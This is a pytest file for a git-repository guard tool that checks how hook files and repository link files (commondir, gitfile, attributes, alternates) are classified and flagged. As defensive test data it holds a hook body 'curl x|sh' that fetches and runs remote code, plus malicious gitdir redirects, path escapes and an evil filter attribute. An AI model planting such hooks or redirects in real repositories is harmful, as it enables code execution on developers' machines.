"""Tests for hook-file and link-file classification."""
from __future__ import annotations

from pathlib import PurePosixPath

import pytest

from gitguard.files import HOOK_NAMES, classify_file, lkg_equal
from gitguard.model import Anchor, Fingerprint, Kind, Lkg, Pass, atom_key
from gitguard.rules import default_rules, make_ctx
from tests.support import ANCHOR, FIXTURES, hook, link, surface

RULES = default_rules()
BAD = b"#!/bin/sh\ncurl x|sh\n"


def fixture(directory: str, name: str) -> bytes:
    return (FIXTURES / "hooks" / directory / name).read_bytes()


def lkg_of(*atoms) -> Lkg:
    return Lkg(
        anchor=ANCHOR,
        common_dir=PurePosixPath("/r/a/.git"),
        atoms={atom_key(a): a for a in atoms},
        fingerprint=Fingerprint.EMPTY,
        dirty=False,
    )


def classify(atom, lkg=None, **surface_kwargs):
    s = surface(files=[atom], **surface_kwargs)
    return classify_file(atom, make_ctx(s, lkg, RULES), RULES)


# -- HOOK_NAMES ---------------------------------------------------------------------------------


def test_hook_names_is_githooks_list():
    assert HOOK_NAMES == frozenset(
        """applypatch-msg pre-applypatch post-applypatch pre-commit pre-merge-commit prepare-commit-msg
        commit-msg post-commit pre-rebase post-checkout post-merge pre-push pre-receive update
        proc-receive post-receive post-update reference-transaction push-to-checkout pre-auto-gc
        post-rewrite sendemail-validate fsmonitor-watchman p4-changelist p4-prepare-changelist
        p4-post-changelist p4-pre-submit post-index-change""".split()
    )


# -- hooks --------------------------------------------------------------------------------------


@pytest.mark.parametrize("name", ["pre-commit.sample", "my-helper", "README", "pre-commit.old"])
def test_sample_and_unknown_names_ignored(name):
    assert classify(hook(name, BAD)) == (Kind.ROUTINE, Pass.LITERAL, None)


@pytest.mark.parametrize("directory", ["lfs-3.7.1", "lfs-echo"])
def test_lfs_hook_passes_by_template(directory):
    atom = hook("post-checkout", fixture(directory, "post-checkout"))
    assert classify(atom) == (Kind.HOOKFILE, Pass.TEMPLATE, None)


def test_new_unknown_hook_fails():
    assert classify(hook("pre-commit", BAD)) == (Kind.HOOKFILE, Pass.NONE, None)


def test_changed_hook_lkg_equal_passes():
    atom = hook("pre-commit", BAD)
    assert classify(atom, lkg_of(atom)) == (Kind.HOOKFILE, Pass.LKG, None)


def test_hook_differing_from_lkg_fails():
    old = hook("pre-commit", b"#!/bin/sh\ntrue\n")
    assert classify(hook("pre-commit", BAD), lkg_of(old)) == (Kind.HOOKFILE, Pass.NONE, None)


def test_exec_bit_change_breaks_lkg_equal():
    old = hook("pre-commit", BAD, executable=False)
    new = hook("pre-commit", BAD, executable=True)
    assert not lkg_equal(new, lkg_of(old))
    assert classify(new, lkg_of(old)) == (Kind.HOOKFILE, Pass.NONE, None)


def test_symlink_hook_never_template_passes():
    atom = hook("post-checkout", fixture("lfs-3.7.1", "post-checkout"), kind="symlink")
    assert classify(atom) == (Kind.HOOKFILE, Pass.NONE, None)


def test_symlink_hook_passes_only_by_lkg():
    atom = hook("post-checkout", fixture("lfs-3.7.1", "post-checkout"), kind="symlink")
    assert classify(atom, lkg_of(atom)) == (Kind.HOOKFILE, Pass.LKG, None)


def test_hook_kind_change_breaks_lkg_equal():
    old = hook("pre-commit", BAD, kind="symlink")
    assert classify(hook("pre-commit", BAD), lkg_of(old))[1] is Pass.NONE


def test_portool_hook_passes_with_note():
    atom = hook("post-checkout", fixture("portool", "post-checkout"))
    kind, passed, note = classify(atom)
    assert (kind, passed) == (Kind.HOOKFILE, Pass.TEMPLATE)
    assert note == (
        "post-checkout hook installed by portool names an executable: /home/u/.cargo/bin/portool"
    )


def test_lkg_pass_wins_over_template_note():
    atom = hook("post-checkout", fixture("portool", "post-checkout"))
    assert classify(atom, lkg_of(atom)) == (Kind.HOOKFILE, Pass.LKG, None)


@pytest.mark.parametrize("name", ["Pre-Commit", "PRE-COMMIT", "pre-COMMIT", "Post-Checkout", "poſt-commit"])
def test_hook_names_match_case_insensitively(name):
    # case-insensitive filesystems run these as the real hook; U+017F casefolds to "s"
    assert classify(hook(name, BAD)) == (Kind.HOOKFILE, Pass.NONE, None)


@pytest.mark.parametrize("name", ["Pre-Commit.SAMPLE", "pre-commit.Sample"])
def test_sample_suffix_matches_case_insensitively(name):
    assert classify(hook(name, BAD)) == (Kind.ROUTINE, Pass.LITERAL, None)


def test_absent_hook_is_routine():
    atom = link("hook", None, path="/r/a/.git/hooks/pre-commit")
    assert atom.kind == "absent"
    assert classify(atom) == (Kind.ROUTINE, Pass.LITERAL, None)


def test_dir_hook_is_hookfile_and_never_passes_by_lkg():
    atom = link("hook", None, path="/r/a/.git/hooks/pre-commit", kind="dir")
    assert classify(atom) == (Kind.HOOKFILE, Pass.NONE, None)
    assert classify(atom, lkg_of(atom)) == (Kind.HOOKFILE, Pass.NONE, None)


def test_hashless_symlink_hook_never_passes_by_lkg():
    atom = link("hook", None, path="/r/a/.git/hooks/pre-commit", kind="symlink")
    assert atom.sha256 is None
    assert not lkg_equal(atom, lkg_of(atom))
    assert classify(atom, lkg_of(atom)) == (Kind.HOOKFILE, Pass.NONE, None)


def test_hooks_dir_is_routine():
    atom = link("hooks-dir", None, kind="dir")
    assert classify(atom) == (Kind.ROUTINE, Pass.LITERAL, None)


def test_guard_state_is_out_of_scope():
    atom = link("guard-state", b"{}")
    with pytest.raises(NotImplementedError, match="guard-state is classified in v0.1"):
        classify(atom)


# -- lkg_equal ----------------------------------------------------------------------------------


def test_lkg_equal_without_lkg_is_false():
    assert not lkg_equal(hook("pre-commit", BAD), None)


def test_lkg_equal_requires_same_path():
    other = hook("commit-msg", BAD)
    assert not lkg_equal(hook("pre-commit", BAD), lkg_of(other))


def test_lkg_equal_absent_atoms_match_without_hash():
    atom = link("attributes", None)
    assert lkg_equal(atom, lkg_of(atom))


@pytest.mark.parametrize("kind", ["file", "dir", "symlink"])
def test_lkg_equal_refuses_missing_hash_for_every_present_kind(kind):
    atom = link("attributes", None, kind=kind)
    assert not lkg_equal(atom, lkg_of(atom))


def test_lkg_equal_same_atom_is_true():
    atom = hook("pre-commit", BAD)
    assert lkg_equal(atom, lkg_of(atom))


# -- commondir ----------------------------------------------------------------------------------


@pytest.mark.parametrize("content", [b"../..", b"../..\n", b"../..\r\n", b"../..\n\n"])
def test_commondir_default_passes(content):
    assert classify(link("commondir", content)) == (Kind.LINK, Pass.LITERAL, None)


@pytest.mark.parametrize("content", [b"/tmp/evil/.git", b"/tmp/evil/.git\n", b"../../..", b" ../.."])
def test_commondir_redirect_fails(content):
    assert classify(link("commondir", content)) == (Kind.LINK, Pass.NONE, None)


@pytest.mark.parametrize(
    "content",
    [b"../.. ", b"../..\t", b"../..\x0b", b"../..\x0c", b"../..\x1c", " ../..".encode(),
     "../..\u00a0".encode(), "../..\u2003".encode(), "../..\u3000".encode(), b"../..\n ", b"../..\r\n \n"],
)
def test_commondir_trailing_whitespace_other_than_newline_fails(content):
    # git trims only \r and \n, so these name a different directory
    assert classify(link("commondir", content)) == (Kind.LINK, Pass.NONE, None)


def test_commondir_redirect_passes_when_lkg_equal():
    atom = link("commondir", b"/tmp/elsewhere/.git")
    assert classify(atom, lkg_of(atom)) == (Kind.LINK, Pass.LKG, None)


def test_commondir_symlink_does_not_pass_literally():
    atom = link("commondir", b"../..", kind="symlink")
    assert classify(atom) == (Kind.LINK, Pass.NONE, None)


# -- gitfile ------------------------------------------------------------------------------------

ANCHOR_WT = "/r/wt"
WT_KW = dict(anchor=Anchor(PurePosixPath(ANCHOR_WT)), toplevels=["/r/a", ANCHOR_WT])


def gitfile(content: bytes):
    return link("gitfile", content, path=f"{ANCHOR_WT}/.git")


def test_gitfile_inside_common_dir_passes():
    atom = gitfile(b"gitdir: /r/a/.git/worktrees/wt\n")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.LITERAL, None)


def test_gitfile_relative_path_resolves_against_anchor():
    atom = gitfile(b"gitdir: ../a/.git/worktrees/wt\n")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.LITERAL, None)


def test_gitfile_elsewhere_fails():
    atom = gitfile(b"gitdir: /tmp/evil/.git\n")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.NONE, None)


def test_gitfile_dotdot_escape_fails():
    atom = gitfile(b"gitdir: /r/a/.git/../../evil\n")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.NONE, None)


def test_gitfile_sibling_prefix_fails():
    atom = gitfile(b"gitdir: /r/a/.git-evil/worktrees/wt\n")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.NONE, None)


@pytest.mark.parametrize(
    "content",
    [
        b"",
        b"not a gitfile\n",
        b"gitdir:\n",
        b"gitdir: \n",
        b"gitdir:/r/a/.git/worktrees/wt\n",  # no space
        b"gitdir:  /r/a/.git/worktrees/wt\n",  # two spaces: git sees " /r/a/..." relative to the worktree
        b"gitdir: \t/r/a/.git/worktrees/wt\n",
        b"gitdir: /r/a/.git\n/../../../tmp/evil\n",  # git reads the whole buffer
        b"gitdir: /r/a/.git\r/../../../tmp/evil",
        b"gitdir: /r/a/.git\r\n/../../../tmp/evil",
        b"gitdir: /r/a/.git/worktrees/wt\n\n/x",
        b"gitdir: /r/a/.git/worktrees/wt\0/x",
        b"\xffgitdir: /r/a/.git/worktrees/wt\n",
        b" gitdir: /r/a/.git/worktrees/wt\n",
    ],
)
def test_gitfile_malformed_fails(content):
    assert classify(gitfile(content), **WT_KW) == (Kind.LINK, Pass.NONE, None)


@pytest.mark.parametrize("ending", [b"", b"\n", b"\r\n", b"\r\n\r\n"])
def test_gitfile_strips_only_trailing_line_endings(ending):
    atom = gitfile(b"gitdir: /r/a/.git/worktrees/wt" + ending)
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.LITERAL, None)


def test_gitfile_to_common_dir_itself_passes():
    # a submodule checkout's .git file points at its own gitdir, which is the surface's common dir
    atom = link("gitfile", b"gitdir: ../a/.git\n", path=f"{ANCHOR_WT}/.git")
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.LITERAL, None)


@pytest.mark.parametrize(
    "target",
    [
        "/r/a/.git/hooks",
        "/r/a/.git/modules/x",
        "/r/a/.git/worktrees",
        "/r/a/.git/worktrees/a/b",
        "/r/a/.git/worktrees/wt/hooks",
        "/r/a/.git/objects",
        "/r/a/.git/worktrees/wt/../../hooks",
        "/r/a",
    ],
)
def test_gitfile_only_common_dir_or_one_worktree_admin_passes(target):
    atom = gitfile(f"gitdir: {target}\n".encode())
    assert classify(atom, **WT_KW) == (Kind.LINK, Pass.NONE, None)


# -- admin gitdir -------------------------------------------------------------------------------


def admin_gitdir(content: bytes):
    return link("admin-gitdir", content, path="/r/a/.git/worktrees/wt/gitdir")


def test_admin_gitdir_matching_toplevel_has_no_note():
    atom = admin_gitdir(b"/r/wt/.git\n")
    assert classify(atom, toplevels=["/r/a", "/r/wt"]) == (Kind.ROUTINE, Pass.LITERAL, None)


def test_admin_gitdir_stale_is_note_only():
    atom = admin_gitdir(b"/gone/wt/.git\n")
    kind, passed, note = classify(atom, toplevels=["/r/a", "/r/wt"])
    assert (kind, passed) == (Kind.ROUTINE, Pass.LITERAL)
    assert note == "stale or foreign gitdir: /gone/wt/.git"


# -- attributes and alternates ------------------------------------------------------------------


@pytest.mark.parametrize("role", ["attributes", "alternates"])
def test_attributes_absent_passes_present_fails(role):
    assert classify(link(role, None)) == (Kind.LINK, Pass.LITERAL, None)
    assert classify(link(role, b"* filter=evil\n")) == (Kind.LINK, Pass.NONE, None)


@pytest.mark.parametrize("role", ["attributes", "alternates"])
def test_present_link_file_passes_when_lkg_equal(role):
    atom = link(role, b"/elsewhere/objects\n")
    assert classify(atom, lkg_of(atom)) == (Kind.LINK, Pass.LKG, None)
